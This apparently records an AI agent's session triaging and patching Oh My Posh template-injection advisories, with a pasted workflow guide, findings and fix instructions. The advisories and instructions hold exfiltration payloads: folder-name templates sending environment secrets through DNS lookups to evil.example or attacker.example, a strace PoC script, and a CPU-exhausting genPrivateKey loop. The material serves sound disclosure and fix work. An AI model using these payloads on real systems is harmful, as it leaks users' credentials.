"sibling sink unpatched" incomplete-fix pattern.
Severity
Moderate. CVSS:3.1 5.3 — `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N`
Metric-by-metric:

* AV:N (Network): delivery is remote — the malicious directory travels in a
cloned git repository, an extracted archive/tarball, or a mounted network/removable
share. (The base advisory scored the sibling `cmd` bug AV:L; N is chosen here
because the exfiltration channel itself is a network DNS egress and the payload is
network-delivered content. AV:L/score 4.7 is a defensible alternative if the
reviewer scores by the local trigger.)
* AC:L: no special conditions; navigating into the directory suffices.
* PR:N: no privileges or authentication.
* UI:R: the victim must `cd` into (or below) the attacker-named directory and
let the prompt render (the next command after `cd`).
* S:U: the impact stays within Oh My Posh's process authority.
* C:H: environment variables commonly hold high-value secrets (cloud
credentials, API tokens, session cookies); they are exfiltrated verbatim, one
DNS-label-sized chunk per lookup, to attacker-controlled DNS infrastructure.
* I:N / A:N: no integrity or availability impact.

CWE

* CWE-918 Server-Side Request Forgery (attacker-controlled hostname resolution)
* CWE-200 / CWE-201 Exposure of Sensitive Information (env-secret exfiltration)
* Root-cause class: incomplete allow/deny-list of dangerous template functions
(CWE-184 / CWE-1336-adjacent).

Affected component

* Package: `github.com/jandedobbeleer/oh-my-posh`
* `src/template/func_map.go` — `dangerousFuncs` (lines 15-22) and `baseFuncMap()`
(lines 25-64): `baseFuncMap` copies all of `sprig.TxtFuncMap()` except the six
`dangerousFuncs`; `getHostByName` is not among them, so it remains in the
restricted map. `restrictedFuncMap` (line 89-90) = `baseFuncMap()`.
* `src/segments/path.go` — `setStyle()` line 290: `template.RenderUntrusted(pt.Path, pt)`
is the reachable untrusted sink (`pt.Path` is built from raw filesystem folder
names).
* Introduced by the fix commit `88ddbe0b` ("gate cmd/readFile/stat/glob behind
trusted templates"), first released in v29.35.1; present through v29.37.0
(latest at time of writing). Affected range: >= 29.35.1, <= 29.37.0 (i.e. every
release that contains the restricted renderer). The default configuration includes
a `path` segment, so no non-default configuration is required.

Reachability (hop-by-hop, every guard named)

1. Attacker ships a directory named, e.g.
`{{$h:=printf "%s.evil.example" .Env.AWS_SECRET_ACCESS_KEY}}{{getHostByName $h}}`
inside a repo / archive / share. Folder names on Linux/macOS may contain any byte
except `/` and NUL; the payload contains no `/`. Guard: path split on `/` —
defeated, the payload needs no separator.
2. Victim clones/extracts and `cd`s into that directory (or any descendant — the path
segment renders every ancestor component).
3. On prompt render, `Path.setStyle()` builds `pt.Path` from the raw folder names and
calls `template.RenderUntrusted(pt.Path, pt)` (`src/segments/path.go:290`).
Guard: RenderUntrusted uses the restricted func map — this correctly blocks
`cmd`/`readFile`/`stat`/`glob`/`env`/`expandenv` (verified: `{{ env "X" }}` fails
to parse and is echoed literally). It does not block `getHostByName`.
4. `getHostByName` (sprig → `net.LookupHost`) is invoked with the attacker-composed
hostname. Guard: template errors keep the raw string — the lookup is attempted
and the DNS query is emitted before `getHostByName` returns its (possible)
NXDOMAIN error, so exfiltration succeeds even though the rendered prompt falls back
to showing the literal template (making the attack visually stealthy).
5. `.Env.*` template data is available in the untrusted render context (verified:
`{{ .Env.OMP_SECRET }}` → the secret's value), so arbitrary environment secrets
can be encoded into the outbound hostname.

Chain holds end to end with attacker-controlled (not user-config) input.
Root cause
The security of the RCE fix rests on the restricted func map containing no function
with host side effects. The maintainer enumerated six such functions
(`cmd/readFile/stat/glob/env/expandenv`) but missed `getHostByName`, a sprig function
that performs network I/O. Because `baseFuncMap()` merges the entire sprig func map
minus only that explicit blocklist, any side-effecting sprig function not on the list
(here, `getHostByName`) silently remains available to untrusted templates.
Exploit path
attacker-named directory (repo/archive/share) → `env.Pwd()` → `pt.Path` (raw folder
names) → `template.RenderUntrusted(pt.Path, pt)` → restricted func map still contains
`getHostByName` → `net.LookupHost("<secret>.evil.example")` → DNS query carrying the
env secret leaves the victim host → attacker's authoritative DNS records it.
Proof of Concept (executed, benign, fully local)
Built from `src/` with `go build -o /tmp/omp ./`. The PoC uses the reserved
`.invalid` TLD (never resolves, never reaches real infrastructure) and observes the
outbound DNS query with `strace`, so nothing leaves the host to any third party.
Full PoC script (`raw/omp-001-poc.sh`):

```
#!/usr/bin/env bash
set -euo pipefail
OMP=${OMP:-/tmp/omp}
cfg=$(mktemp --suffix=.omp.json)
cat > "$cfg" <<'JSON'
{ "version":3, "blocks":[{"type":"prompt","alignment":"left","segments":[
  {"type":"path","style":"plain","foreground":"#ffffff",
   "template":"{{ .Path }}","properties":{"style":"full"}}]}]}
JSON

# 1) getHostByName executes from a folder name (restricted renderer, default-style config)
"$OMP" print primary --config "$cfg" --shell fish --pwd '/home/v/{{ getHostByName `localhost` }}'

# 2) environment secret is readable as .Env template data in the same context
OMP_SECRET=s3cr3tAWSkey "$OMP" print primary --config "$cfg" --shell fish --pwd '/home/v/{{ .Env.OMP_SECRET }}'

# 3) end-to-end exfil: secret encoded into a DNS query, observed leaving the process
SEC=EXFILtestMARKER42
OMP_SECRET=$SEC strace -f -e trace=write,sendto,sendmmsg -s 400 \
  "$OMP" print primary --config "$cfg" --shell fish \
  --pwd "/home/v/{{ \$h := printf \"%s.exfil.invalid\" .Env.OMP_SECRET }}{{ getHostByName \$h }}" \
  2>&1 >/dev/null | grep -a "$SEC" | head -2
rm -f "$cfg"
```

Observed output:

```
### 1) getHostByName executes from a folder name
/home/v/127.0.0.1                # the folder-name template resolved to the looked-up IP: the func RAN

### 2) environment secret is readable as .Env template data
/home/v/s3cr3tAWSkey            # secret available to encode into a hostname

### 3) end-to-end exfil: secret in the outbound DNS query
write(3, "L#\1 \0\1\0\0\0\0\0\1\21EXFILtestMARKER42\5exfil\7invalid\0\0\1\0\1...", 60) = 60
write(6, "\257\204\1 \0\1\0\0\0\0\0\1\21EXFILtestMARKER42\5exfil\7invalid\0\0\34\0\1...", 60) = 60

```

The DNS wire-format `\21EXFILtestMARKER42\5exfil\7invalid` is a query for
`EXFILtestMARKER42.exfil.invalid` where `EXFILtestMARKER42` is the value of
`$OMP_SECRET` read via `.Env` — the secret is exfiltrated in a DNS lookup triggered
solely by the directory name.
Adversarial re-read (what I tried in order to refute it)

* "Path splitting on `/` blocks the payload." The payload contains no `/`;
confirmed it executes from a `--pwd` value (which is exactly `env.Pwd()` for a real
directory of that name).
* "getHostByName errors on a non-existent name, so nothing happens." strace shows
the DNS query is emitted before the lookup fails; the exfil channel is the query,
not the return value. The prompt showing the raw template only makes it stealthier.
* "`.Env` isn't populated in real use." Oh My Posh runs with the invoking shell's
full environment; `.Env.OMP_SECRET` resolved to its value in testing.
* "This is just GHSA-6xj8." No: that was `cmd` RCE via the full/trusted func map;
the fix removed `cmd`/`readFile`/`stat`/`glob`/`env`/`expandenv` from the untrusted
map. `getHostByName` is a different, network-side-effecting function the blocklist
missed — a distinct sink (SSRF/exfil, CWE-918/200) on the same source. Confirmed
`env`/`expandenv` are gone (echoed literally) while `getHostByName` still fires.
* "Only a beacon, no data." `.Env.*` (and other prompt context) can be encoded
into the hostname, so real secret values are exfiltrated, not just a hit signal.

Result: the finding survives. CONFIRMED.
Remediation

* Add `getHostByName` to `dangerousFuncs` in `src/template/func_map.go` (it performs

# Code Changes

The workflow for going from an issue, pull request, idea, or feature request to shipped code.
Follow the phases in order. Analysis always comes first; code comes last.

Each phase has a reference file with the full instructions. **Read the reference file when you
enter the phase** — not before, and never skip it because the phase "looks obvious".

## Roles

Assign work based on model capability. The coordinator is not the strongest model — it's the one
that stays resident, owns every phase by default, and knows when it's out of its depth.

| Role        | Capability tier                                               | Owns                                                                          |
| ----------- | -------------------------------------------------------------- | ------------------------------------------------------------------------------ |
| Coordinator | Capable mid-tier, resident for the whole task                | Analysis, plan, delegation, supervision, verification, delivery — by default |
| Escalation  | Strongest reasoning model available; invoked only on trigger | The specific judgment call the coordinator flagged, then control returns     |
| Implementer | Same tier as coordinator, or smaller for trivial edits        | Executing one pinned, self-contained task                                    |

Concrete model names per vendor (Anthropic, OpenAI, Google) and how to run the split in Claude
Code, GitHub Copilot, Codex, or IDE agents: [references/model-tiers.md](references/model-tiers.md).

When the current agent already runs at implementer tier, there's no separate delegation step for
standard work: plan and execute directly, still following every phase. Escalate to the strongest
model only when a trigger fires — see [references/escalate.md](references/escalate.md) — never by
default and never for a routine judgment call the coordinator is equipped to make itself.

## The flow

1. **Analyze** ([references/analyze.md](references/analyze.md)) — root cause and scope,
   validated against the code, never against the report alone.
2. **Plan** ([references/plan.md](references/plan.md)) — pinned spec, task split, parallel vs
   sequential, workspace per task.
3. **Delegate** ([references/delegate.md](references/delegate.md)) — match each task to the
   right executor, coordinator-tier by default.
4. **Supervise** ([references/supervise.md](references/supervise.md)) — monitor, unblock, and
   critically review implementer output.
5. **Verify** ([references/verify.md](references/verify.md)) — quality gates plus functional
   proof, never delegated downward.
6. **Deliver** ([references/deliver.md](references/deliver.md)) — conventional commits and an
   outcome-first report.

Analyze, Supervise, and Verify each carry an escalation checkpoint — see
[references/escalate.md](references/escalate.md) — for handing one specific judgment call to the
strongest available model without giving up ownership of the phase.

**Stop gate:** Phase 1 ends with reporting the analysis and proposed approach to the user and
waiting for a go. Skip the gate only when the user already gave the go in the request itself
("do it", "fix it and commit", "implement with Sonnet").

## Special cases

These entry points replace or extend Phase 1; the rest of the flow applies unchanged.

- Pull request review comments →
  [references/pr-review-comments.md](references/pr-review-comments.md)
- Issue triage → [references/issue-triage.md](references/issue-triage.md)

# Phase 1 — Analyze

Start every task here, no matter how it arrived: issue link, PR number, verbal idea, bug report.
No code gets written or edited during this phase.

## Gather the full context

- Issues and PRs: `gh issue view <n> --comments` / `gh pr view <n> --comments`, plus linked
  issues, referenced discussions, and any code the report points at.
- Ideas and verbal requests: restate the goal and constraints in your own words. If the request
  is ambiguous, resolve the ambiguity now — not halfway through implementation.
- Check for prior art: existing helpers, similar segments/modules, and past commits that touched
  the same area (`git log -- <path>`).

## Reproduce before theorizing

Reproduce the problem when possible. A reproduction turns the analysis from a hypothesis into a
fact and gives Phase 5 its verification case for free. When reproduction is impossible (platform,
hardware, credentials), say so explicitly in the report and mark the fix as unverified-by-repro.

## Find the root cause in the code

- Read the actual implementation. Never reason from the issue text, a review comment, or a stack
  trace alone — reports and bot reviewers are frequently wrong.
- Distinguish the root cause from the symptom. Fixing where it crashes is not the same as fixing
  why it crashes.
- State what the change should be, which files it touches, and what it deliberately leaves alone.

## When to escalate

If root cause can't be pinned with confidence, or the fix looks architectural, security-sensitive,
or irreversible, hand the specific question to the strongest available model instead of guessing —
see [references/escalate.md](references/escalate.md). Resume ownership of the phase once the
question is answered.

## Output of this phase

A short analysis report to the user containing:

1. What is actually happening and why (root cause, with file references).
2. The proposed change and its scope.
3. What is intentionally out of scope.
4. Open questions, if any remain.

## Stop gate

Report the analysis and wait for a go before implementing. Skip the gate only when the user
already gave the go in the request itself ("do it", "fix it and commit", "implement with
Sonnet"). A go given for analysis is not a go for implementation.

here's the fourth:

Description
Summary
`RenderUntrusted` drops `env` and `expandenv` from the func map, but `patchTemplate` rewrites `.Env.NAME` into `(call .Getenv "NAME")`, and `Getenv` is a field on the render context rather than a func-map entry. A directory name containing `{{ .Env.SECRET }}` therefore still expands environment variables at prompt time.
This is the residual of [GHSA-6xj8-qv9j-xcjq](https://github.com/advisories/GHSA-6xj8-qv9j-xcjq), the path-segment template injection. That fix restricted the function map; it did not close the `.Env.` syntax, which does not go through the function map.
Where it is
`src/template/text.go`, in `patchTemplate`:

```
case strings.HasPrefix(prop, ".Env."):
    // we need to replace the property with the getEnv function
    // so we can access the environment variables directly
    fmt.Fprintf(&result, `(call .Getenv "%s")`, strings.TrimPrefix(prop, ".Env."))
```

`src/template/render.go` binds the target unconditionally, with no trust check:

```
c.Getenv = env.Getenv
```

`src/template/func_map.go` is where the fix lives, and it is correct as far as it goes:

```
var restrictedFuncMap = sync.OnceValue(func() template.FuncMap {
    return template.FuncMap(baseFuncMap())
})

func funcMap(trusted bool) template.FuncMap {
    if trusted {
        return sharedFuncMap()
    }
    return restrictedFuncMap()
}
```

`env` and `expandenv` are added only to the shared map. The rewrite above bypasses that entirely, because `.Getenv` is resolved from the context struct at execute time and never consults the func map.
The reachable sink is `src/segments/path.go:290`:

```
if txt, err := template.RenderUntrusted(pt.Path, pt); err == nil {
```

which is the only non-test caller of `RenderUntrusted` in the tree.
Reproduction
Using the project's own `template` package at `main` (`9796746`), one test with three inputs:

```
os.Setenv("OMP_POC_SECRET", "LEAKED-VALUE-FROM-ENV")
e := &runtime.Terminal{}
e.Init(&runtime.Flags{})
Init(e, nil, nil)

for _, tpl := range []string{
    `{{ .Env.OMP_POC_SECRET }}`,
    `{{ env "OMP_POC_SECRET" }}`,
    `{{ expandenv "$OMP_POC_SECRET" }}`,
} {
    got, err := RenderUntrusted(tpl, nil)
    t.Logf("RenderUntrusted(%-32s) => %q  err=%v", tpl, got, err)
}
```


```
RenderUntrusted({{ .Env.OMP_POC_SECRET }}       ) => "LEAKED-VALUE-FROM-ENV"  err=<nil>
RenderUntrusted({{ env "OMP_POC_SECRET" }}      ) => ""  err=invalid template text
RenderUntrusted({{ expandenv "$OMP_POC_SECRET" }}) => ""  err=invalid template text

```

The two rejected lines are the point. The restriction works on the paths it covers; `.Env.` is not one of them.
Attacker model
Someone who can get a directory onto the victim's filesystem with a crafted name: a repository, an extracted archive, a shared or synced folder, a container mount. The victim needs only to `cd` into it with a config that includes a path segment, which the default configs do.
Impact
Environment values are rendered into the prompt. That is terminal output, and it goes wherever terminal output goes: scrollback, screen shares, asciinema recordings, screenshots in bug reports, CI logs when a shell prompt is captured.
`.Env.` reads any variable by name, so `AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, `OPENAI_API_KEY` are all one directory name away. No command execution, which is what separates this from [GHSA-6xj8-qv9j-xcjq](https://github.com/advisories/GHSA-6xj8-qv9j-xcjq).
A detail worth flagging: the attacker does not need to see the prompt. A name like `{{ .Env.GITHUB_TOKEN }}` inside a repository the victim later screenshots or streams is a plausible path, and so is a directory that ends up in a pasted `ls` output.
Suggested fix
Make the rewrite trust-aware. `patchTemplate` already knows the trust level through the `*Text` it is patching, so the `.Env.` case can refuse rather than rewrite:

```
case strings.HasPrefix(prop, ".Env."):
    if !t.trusted {
        return "", errors.New(InvalidTemplate)
    }
    fmt.Fprintf(&result, `(call .Getenv "%s")`, strings.TrimPrefix(prop, ".Env."))
```

Leaving `Getenv` off the context for untrusted renders would work too, and is arguably cleaner since it removes the capability rather than one syntax for reaching it. Either way the fix belongs where the capability is granted, not in the func map, which is what the previous fix assumed.
`.Segments` is worth the same look while you are in there. It is rewritten in the same switch and reaches `MustGet` on the context, so if any segment carries sensitive data the same reasoning applies.
A test asserting `RenderUntrusted("{{ .Env.ANYTHING }}")` errors, sitting next to the existing `env` and `expandenv` cases, would pin it.
Why I do not think this is a duplicate
[GHSA-6xj8-qv9j-xcjq](https://github.com/advisories/GHSA-6xj8-qv9j-xcjq) is arbitrary command execution through path-segment template injection, and its fix is the restricted func map shown above. That fix holds: the `env` and `expandenv` lines in the output error out. This is the syntax it did not cover.
[GHSA-fwjx-9p69-h25h](https://github.com/advisories/GHSA-fwjx-9p69-h25h) is terminal escape-sequence injection in prompt segment data, unrelated to template functions.
Severity
`CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N`, about 6.2. `UI:R` because the victim has to enter the directory, `C:H` because the disclosed values are typically credentials. Confidentiality only; the command-execution route is genuinely closed.
CWE-1336, with CWE-200.
How I found it and a note on tooling
After a sandbox fix that removes functions from a map, the question worth asking is whether every capability actually goes through that map. Here the template preprocessor rewrites `.Env.` into a call against a context field, so the capability never touches the map the fix hardened. I used AI assistance while investigating and drafting. The output above is from a test I wrote and ran against the project's own package at the commit named.

I've received the fourth advisory and now I'm moving into the analysis phase. I'll spin up four sub-agents using the Fable model to analyze each advisory in parallel, validating the claims against the codebase without making any changes yet. Once I gather their findings, I'll consolidate the analysis, work through remediations and validation, then propose a solution.

For each agent, I need to have them inspect the relevant source files—the template rendering functions, path handling, terminal output writers, and prompt engine—to verify the vulnerability claims against the current codebase state and line numbers. The four advisories break down as: an SSRF/DNS exfiltration issue in the restricted function map, an OSC escape injection vulnerability in terminal output, and what appears to be a near-duplicate advisory covering the same terminal filtering problem from a different angle.

Looking at the root causes, advisories 2 and 3 are essentially the same vulnerability—unfiltered control characters in terminal output—reported separately. Advisories 1 and 4 both stem from incomplete sandboxing in the template renderer: one exploits missing functions in the restricted map, the other bypasses the map entirely through context field access. The natural fix strategy groups them as template sandbox escapes (requiring both a strict allowlist for functions and stripping dangerous capabilities from the rendering context) and terminal escape injection (needing proper filtering of control sequences).

I'm planning to spin up verification agents for each advisory to check the actual code against the claims, report current line numbers and validity, then synthesize the findings—though I could combine the duplicate terminal injection advisories into a single verification task since they hit the same code paths. to wait for all 4 notifications before synthesizing the results. I'll launch them in parallel as background agents in a single message, then hold off responding until every analysis comes back. For each agent, I'm setting up instructions to read the code, verify the specific claims in each advisory, check the current line numbers and state in this branch, and look through recent commits and the changelog to see if any of these issues have already been patched.

I'll use the fable model for these agents and launch them now.

Claim: `getHostByName` allows DNS-based exfiltration of `.Env.*` secrets, reachable via `src/segments/path.go` where `pt.Path` (raw filesystem folder names, attacker-controlled) is rendered via `template.RenderUntrusted`.

Your job:

3. Check whether `.Env.*` data is actually accessible from the untrusted render context today (look at `src/template/render.go`, `src/template/text.go`, `src/template/context.go` or wherever the render context / `.Env` binding lives).
4. Determine if this specific advisory's claim (getHostByName reachable + .Env accessible from untrusted context) is CONFIRMED, PARTIALLY CONFIRMED, or REFUTED against the current code — not the advisory's cited commit/version. Note any drift (e.g. maybe getHostByName was already removed, or dangerousFuncs already changed since the advisory was filed).
5. Look for how many OTHER sprig functions with side effects (network I/O, filesystem, process, time-based, randomness affecting security) might ALSO be missing from dangerousFuncs — sprig has functions like `genPrivateKey`, `htpasswd`, `date` etc. List any you find that look security-relevant and are not blocked, so we know if an allowlist rewrite is warranted vs a narrow patch.
6. Propose a precise, minimal code fix (exact diff-level description: which file, which lines, what changes) plus a note on whether a broader allowlist-based rewrite of the restricted func map is justified given what you found in step 5.

Report back: (a) verdict CONFIRMED/PARTIALLY CONFIRMED/REFUTED with evidence (file:line quotes), (b) exact current reachability chain, (c) list of other suspect sprig functions found, (d) proposed minimal fix, (e) whether a broader allowlist rewrite is warranted. Be precise and cite file:line for every claim. Under 500 words plus code quotes.

All 4 confirmed. Two are real duplicates. Full picture:

## Group A — untrusted-template sandbox escape (2 advisories, 1 fix)

**GHSA-f3c9-xqww-j6mf** (getHostByName) — CONFIRMED. `sprig.TxtFuncMap()` minus 6-name blocklist (`dangerousFuncs`, [func_map.go:15](src/template/func_map.go)) leaves `getHostByName` in the untrusted map. Reachable from folder name via `RenderUntrusted(pt.Path, pt)` ([path.go:261](src/segments/path.go:261)). Empirically confirmed DNS-based `.Env` exfil. Agent also found ~12 more unblocked sprig funcs (`genPrivateKey`, `bcrypt`, `htpasswd`, `genSignedCert`, ...) — no network egress but CPU-DoS via `{{ range until 500 }}{{ genPrivateKey "rsa" }}{{ end }}`, hangs shell indefinitely.

**GHSA-xhgr-25r7-c3fm** (`.Env` bypass) — CONFIRMED, worse than reported. `patchTemplate` rewrites `.Env.X` to `(call .Getenv "X")`, and `Getenv` bound unconditionally on context regardless trust ([render.go:29](src/template/render.go)). Advisory's own suggested fix (patch the rewrite) is incomplete — agent proved `{{ call .Getenv "X" }}` written directly also leaks, no rewrite needed. Real hole is the field binding, not the syntax.

**Root cause, same class both**: restricted renderer built as blocklist/leftover-capability instead of allowlist. Two holes so far, structurally more likely.

**Fix** (one PR):
1. Add `getHostByName` to `dangerousFuncs` ([func_map.go:15](src/template/func_map.go)).
2. Bind `Getenv` per trust level in `context.init` ([render.go](src/template/render.go)) — empty-string stub when untrusted, not nil (nil breaks legit `.Env.` refs with `IncorrectTemplate`). Closes both the rewrite path and raw `call .Getenv`.
3. Recommend (separate follow-up, not blocking): convert `restrictedFuncMap` to explicit allowlist so future sprig upgrades can't reopen this class. Optional, larger surface.

Since these groups touch completely separate files, I can run them in parallel, though the guidance suggests sequencing when uncertain to avoid merge conflicts.

For implementation, I'll delegate both groups to Sonnet 5 agents—this is security-sensitive code that warrants the standard tier rather than cheaper models, and the analysis phase already used Fable per the user's request. Now I'm defining the specific task parameters for Group A.

The template sandbox hardening will involve modifying func_map.go to add `getHostByName` to the dangerous functions allowlist, then adding a set of cryptographic and password-related sprig functions that can cause DoS—I need the implementer to verify each function name against the vendored sprig version first to catch any naming mismatches before compilation.

For the trusted template behavior, I should follow the existing pattern where dangerous functions are excluded from the base map but then selectively re-added to the shared map for trusted use; however, for the DoS-capable functions, the recommendation is to block them entirely without re-adding them back. So I need to follow the existing pattern for blocking dangerous functions in untrusted contexts while preserving them for trusted templates — adding getHostByName and the DoS functions to the dangerous list, then re-adding them back through sharedFuncMap for trusted access, just like the current approach handles cmd, readFile, stat, and other sensitive functions.

For the Getenv binding, I'm implementing the context initialization that conditionally sets Getenv based on trust level — returning the actual environment getter for trusted templates and a no-op function for untrusted ones, which the agent already tested and verified works.

Now for Phase 2, I need to convert the restrictedFuncMap from a blocklist approach to an explicit allowlist of the actual functions oh-my-posh templates use — roughly 120 functions across string, math, list, dict, regex, and encoding categories. The tricky part is determining whether this map applies globally or just to specific untrusted render paths like path segments, since breaking legitimate template configs would be a real risk if I'm too restrictive.

Looking at the code flow, restrictedFuncMap only gets used when RenderUntrusted is called, which happens in path.go for rendering untrusted folder names — not for general config templates, which use RenderTrusted and have full access to sharedFuncMap. This means the risk is actually quite low since folder names shouldn't contain templates anyway; that's purely an attack surface. So I can take a conservative approach: build the allowlist from what's currently in baseFuncMap minus the dangerous functions that were already being blocked, rather than trying to guess what's actually needed. Defining the safe function categories...

I need to be deliberate about what gets included in the allowlist—things like string operations, basic encoding, type conversion, and path manipulation are clearly safe, while filesystem access, network calls, and crypto operations should stay excluded. The best approach is to have a capable implementer enumerate the sprig functions systematically using the Go documentation, categorize each one, and then build an explicit allowlist with a test that guards against future drift. 23		Getenv func(string) string
24		cache.Template
25	}
26	
27	func (c *context) init(t *Text) {
28		c.Data = t.context
29		c.Getenv = env.Getenv

31	}

33	var (
34		renderPool *generics.Pool[*renderer]
35	)
36	
37	// renderer holds only per-render mutable state: an output buffer and a context.
38	// The parsed template is now looked up from the shared parsedTemplates cache.
39	type renderer struct {
40		context *context
41		buffer  bytes.Buffer
42	}
43	
44	func (t *renderer) release() {
45		t.buffer.Reset()
46		t.context.Data = nil
47		renderPool.Put(t)
48	}
49	
50	// Encodes the raw (unpatched) template text, the trust level (parsed
51	// templates are bound to a func map at Parse time, so a trusted and a
52	// restricted render of identical text must never share a cache entry), and,
53	// when context is non-nil, the reflect.Type of the context so that two
54	// different struct types whose patchTemplate output would differ (via
55	// hasField) get separate cache entries. For map[string]any contexts the key
56	// also includes the sorted exported key names, since patchTemplate output
57	// depends on which keys are present.
58	func templateCacheKey(rawText string, trusted bool, ctx any) string {
59		key := rawText + "\x00" + strconv.FormatBool(trusted)
60	
61		if ctx == nil {
62			return key
63		}
64	
65		t := reflect.TypeOf(ctx)
66		if t.Kind() == reflect.Map {
67			if m, ok := ctx.(map[string]any); ok {
68				keys := make([]string, 0, len(m))
69				for k := range m {
70					if r, _ := utf8.DecodeRuneInString(k); unicode.IsUpper(r) {
71						keys = append(keys, k)
72					}
73				}
74				sort.Strings(keys)
75				return key + "\x00" + t.String() + "\x00" + strings.Join(keys, "\x01")
76			}
77		}
78	
79		return key + "\x00" + t.String()
80	}
81	
82	// The first call for a given key parses and stores it; subsequent calls
83	// return the cached value. Concurrent first-renders of the same template
84	// may both parse, but LoadOrStore ensures only one result is shared.
85	func parsedTemplate(text *Text) (*template.Template, error) {
86		// Key on the raw, unpatched template text plus the trust level and context
87		// type so that cache hits can skip patchTemplate entirely: patching is only
88		// needed the first time a given (raw template, trust level, context type)
89		// combination is seen.
90		key := templateCacheKey(text.template, text.trusted, text.context)
91	
92		if cached, ok := parsedTemplates.Load(key); ok {
93			return cached.(*template.Template), nil
94		}
95	
96		// Cache miss: patch the raw template into its executable form.
97		text.patchTemplate()
98	
99		// Parse into a fresh template with the func map matching this render's trust level.
100		tmpl, err := template.New("cache").Funcs(funcMap(text.trusted)).Parse(text.template)
101		if err != nil {
102			return nil, err
103		}
104	
105		// Store; if another goroutine already stored an equivalent template, use theirs.
106		actual, _ := parsedTemplates.LoadOrStore(key, tmpl)
107		return actual.(*template.Template), nil
108	}
109	
110	func (t *renderer) execute(text *Text) (string, error) {
111		tmpl, err := parsedTemplate(text)
112		if err != nil {
113			log.Error(err)
114			return "", errors.New(InvalidTemplate)
115		}
116	
117		t.context.init(text)
118	
119		err = tmpl.Execute(&t.buffer, t.context)
120		if err != nil {
121			log.Error(err)
122			return "", errors.New(IncorrectTemplate)
123		}
124	
125		output := t.buffer.String()
126	
127		// issue with missingkey=zero ignored for map[string]any
128		// https://github.com/golang/go/issues/24963
129		output = strings.ReplaceAll(output, "<no value>", "")
130	
131		return output, nil
132	}

## Fix 1 — block getHostByName and DoS-capable functions from untrusted templates

`src/template/func_map.go` currently has:
```go
var dangerousFuncs = map[string]bool{
	"cmd":       true,
	"readFile":  true,
	"stat":      true,
	"glob":      true,
	"env":       true,
	"expandenv": true,
}
```
`baseFuncMap()` merges ALL of `sprig.TxtFuncMap()` except these six names into the map used by both `RenderTrusted` and `RenderUntrusted` (via `restrictedFuncMap`, `sync.OnceValue`-cached). `sharedFuncMap()` (trusted only) re-adds the six blocked names back afterward (lines 68-80) so trusted config templates keep full access.

Problem: `getHostByName` (sprig, does a live `net.LookupHost` DNS lookup) is NOT in `dangerousFuncs`, so it's reachable from `RenderUntrusted`, which renders attacker-controlled data (e.g. directory names, via `src/segments/path.go`). A folder named `{{ getHostByName (printf "%s.attacker.example" .Env.SOME_SECRET) }}` exfiltrates an env var over DNS the instant the victim `cd`s into it and the prompt renders. Confirmed and reproduced.

Also confirmed reachable and NOT blocked: several sprig functions that are CPU-expensive enough to hang the shell when called in a loop from an attacker-controlled folder name (e.g. `{{ range until 500 }}{{ genPrivateKey "rsa" }}{{ end }}` hangs indefinitely). These are DoS, not exfiltration, but same untrusted-reachability problem. Candidate names found during triage (VERIFY each one actually exists in the vendored sprig version before adding — run `go doc github.com/Masterminds/sprig/v3` from `src/`, or read the vendored/module source, don't guess): `genPrivateKey`, `genCA`, `genCAWithKey`, `genSelfSignedCert`, `genSelfSignedCertWithKey`, `genSignedCert`, `genSignedCertWithKey`, `buildCustomCert`, `bcrypt`, `htpasswd`, `derivePassword`, `encryptAES`, `decryptAES`, `randBytes`. Drop any name from this list that doesn't actually exist in the vendored sprig; note in your final report which ones you dropped or added beyond this list, if any (e.g. if sprig also exposes other clearly-expensive crypto/network funcs you spot while checking).

**Required change:**
1. Add `getHostByName` and every verified DoS-capable function name to `dangerousFuncs`.
2. In `sharedFuncMap()` (lines 65-83), re-add each of the newly-blocked names back for trusted templates only, mirroring the exact existing pattern used for `env`/`expandenv` (look up each name in `sprig.TxtFuncMap()` and add if present) or `cmd`/`readFile`/`stat`/`glob` (direct assignment) — whichever pattern fits (these are sprig funcs, not local ones, so follow the `env`/`expandenv` lookup pattern). Trusted config-authored templates must keep full access to all of these; only the untrusted/restricted map loses them.

## Fix 2 — scope `.Getenv` (env var access) to trusted templates only

`src/template/render.go` currently has:
```go
func (c *context) init(t *Text) {
	c.Data = t.context
	c.Getenv = env.Getenv
	c.Template = *Cache
}
```
`env` here is the package-level `runtime.Environment` set by `Init()` in `src/template/init.go`.

Problem: `Getenv` is bound unconditionally regardless of trust level. `src/template/text.go`'s `patchTemplate` rewrites `.Env.NAME` syntax into `(call .Getenv "NAME")` — see `text.go` around line 136-139 — with no trust check, so untrusted templates can read `.Env.*` and leak secrets into the rendered prompt (via the same directory-name attack vector). Worse: writing `{{ call .Getenv "SOME_VAR" }}` directly (bypassing the `.Env.` syntax and its rewrite entirely) ALSO leaks — confirmed by test. So the fix must be at the binding, not at `patchTemplate`'s rewrite logic (do not touch `text.go` for this).

**Required change**, exact diff for `render.go`:
```go
func (c *context) init(t *Text) {
	c.Data = t.context
	c.Template = *Cache

	if t.trusted {
		c.Getenv = env.Getenv
		return
	}

	c.Getenv = func(string) string { return "" }
}
```
Empty-string return (not nil) is deliberate: a nil func would make template execution error out (`IncorrectTemplate`) for any untrusted text containing `.Env.` or `.Getenv`, breaking rendering instead of just yielding no value — and this matches the existing `<no value>` → `""` normalization already done elsewhere in this file (`execute()`, near the end).

- Do NOT convert `restrictedFuncMap` from blocklist to allowlist — that's a separate, later task. Leave the blocklist mechanism as-is, just extend `dangerousFuncs`.
